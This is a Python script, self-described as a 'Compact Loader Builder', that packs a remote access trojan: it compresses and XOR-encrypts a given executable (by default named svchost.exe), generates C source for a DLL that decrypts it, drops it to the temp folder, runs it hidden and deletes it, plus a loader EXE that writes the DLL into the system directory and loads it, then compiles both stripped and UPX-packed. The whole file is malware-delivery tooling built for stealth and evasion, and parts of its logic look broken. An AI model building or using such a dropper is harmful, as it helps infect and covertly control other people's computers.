"""
Compact Loader Builder
Creates small EXE + DLL with encrypted RAT
"""

import os
import sys
import subprocess
import shutil
import random
import string
import zlib
import base64
from pathlib import Path

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def create_dll_and_loader(original_exe_path, output_dir):
    print("Reading original EXE...")
    with open(original_exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"Original size: {len(exe_data) / (1024*1024):.1f} MB")
    
    print("Compressing...")
    compressed = zlib.compress(exe_data, level=9)
    print(f"Compressed size: {len(compressed) / (1024*1024):.1f} MB")
    
    print("Encrypting...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(compressed):
        encrypted.append(byte ^ key[i % len(key)])
    
    data_b64 = base64.b64encode(encrypted).decode('ascii')
    key_b64 = base64.b64encode(key).decode('ascii')
    
    print("Generating DLL with embedded RAT...")
    
    dll_name = f'lib{generate_random_string()}.dll'
    
    dll_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:DllMain")

static const unsigned char rat_data[] = 
    "{data_b64}";
static const unsigned char xor_key[] = 
    "{key_b64}";

void xor_decrypt(unsigned char* data, int len) {{
    for(int i = 0; i < len; i++) {{
        data[i] ^= xor_key[i % 32];
    }}
}}

void run_rat() {{
    char temp_path[MAX_PATH];
    char temp_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(temp_file, "%s%s", temp_path, "tmp.exe");
    
    // Decrypt
    int data_len = strlen(rat_data);
    unsigned char* decrypted = (unsigned char*)malloc(data_len);
    memcpy(decrypted, rat_data, data_len);
    xor_decrypt(decrypted, data_len);
    
    // Write to temp
    HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {{
        DWORD written;
        WriteFile(hFile, decrypted, data_len, &written, NULL);
        CloseHandle(hFile);
        
        // Run
        STARTUPINFOA si = {{sizeof(si)}};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        CreateProcessA(temp_file, NULL, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        // Delete after 3 seconds
        Sleep(3000);
        DeleteFileA(temp_file);
    }}
    free(decrypted);
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run_rat, NULL, 0, NULL);
    }}
    return TRUE;
}}
'''
    
    dll_src = os.path.join(output_dir, f'{dll_name}.c')
    with open(dll_src, 'w', encoding='utf-8') as f:
        f.write(dll_code)
    
    print(f"DLL source created: {dll_name}.c")
    
    # Create loader EXE
    loader_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

int main() {{
    char dll_path[MAX_PATH];
    char system_dir[MAX_PATH];
    GetSystemDirectoryA(system_dir, MAX_PATH);
    sprintf(dll_path, "%s\\\\{dll_name}", system_dir);
    
    // Extract DLL from resources
    HMODULE hModule = GetModuleHandleA(NULL);
    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCE(101), "DLL");
    if (!hRes) return 1;
    
    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return 1;
    
    DWORD resSize = SizeofResource(hModule, hRes);
    unsigned char* pData = (unsigned char*)LockResource(hResData);
    
    // Save DLL
    HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;
    
    DWORD written;
    WriteFile(hFile, pData, resSize, &written, NULL);
    CloseHandle(hFile);
    
    // Load DLL
    HMODULE hDll = LoadLibraryA(dll_path);
    if (!hDll) {{
        // Try alternative location
        GetCurrentDirectoryA(MAX_PATH, dll_path);
        sprintf(dll_path, "%s\\\\{dll_name}", dll_path);
        hDll = LoadLibraryA(dll_path);
        if (!hDll) return 1;
    }}
    
    // Delete DLL
    Sleep(2000);
    DeleteFileA(dll_path);
    
    return 0;
}}
'''
    
    loader_name = f'loader_{generate_random_string()}.c'
    loader_path = os.path.join(output_dir, loader_name)
    with open(loader_path, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print(f"Loader created: {loader_name}")
    
    return dll_src, loader_path, dll_name

def compile_with_mingw(source_path, output_path, is_dll=False):
    print(f"Compiling {source_path}...")
    
    cmd = [
        'gcc',
        source_path,
        '-o', output_path,
        '-O3',
        '-s',
        '-fno-exceptions',
        '-fno-rtti',
        '-fno-stack-protector',
        '-fvisibility=hidden',
        '-Wl,--gc-sections',
        '-Wl,--strip-all',
        '-Wl,--subsystem,windows',
        '-mwindows',
        '-static'
    ]
    
    if is_dll:
        cmd.extend(['-shared'])
    
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e.stderr}")
        return False

def compress_with_upx(exe_path):
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', exe_path], capture_output=True, check=True)
        return True
    except:
        return False

def build_loader(original_exe_path):
    print("=" * 60)
    print("COMPACT LOADER BUILDER")
    print("=" * 60)
    
    if not os.path.exists(original_exe_path):
        print(f"File not found: {original_exe_path}")
        return None
    
    output_dir = os.path.dirname(original_exe_path)
    
    # Create DLL and loader
    dll_src, loader_src, dll_name = create_dll_and_loader(original_exe_path, output_dir)
    
    # Compile DLL
    dll_path = os.path.join(output_dir, dll_name)
    if not compile_with_mingw(dll_src, dll_path, is_dll=True):
        print("DLL compilation failed")
        return None
    
    # Compile loader
    loader_exe = os.path.join(output_dir, f'loader_{generate_random_string()}.exe')
    if not compile_with_mingw(loader_src, loader_exe, is_dll=False):
        print("Loader compilation failed")
        return None
    
    # Compress
    compress_with_upx(loader_exe)
    
    original_size = os.path.getsize(original_exe_path) / (1024 * 1024)
    dll_size = os.path.getsize(dll_path) / (1024 * 1024)
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Loader: {loader_exe} ({final_size:.2f} MB)")
    print(f"DLL: {dll_path} ({dll_size:.2f} MB)")
    print(f"Original RAT: {original_size:.1f} MB")
    print(f"Total size: {final_size + dll_size:.2f} MB")
    print(f"Saved: {original_size - (final_size + dll_size):.1f} MB")
    print("=" * 60)
    
    # Cleanup
    try:
        os.remove(dll_src)
        os.remove(loader_src)
    except:
        pass
    
    return loader_exe, dll_path

if __name__ == "__main__":
    exe_path = "dist/svchost.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_loader(exe_path)
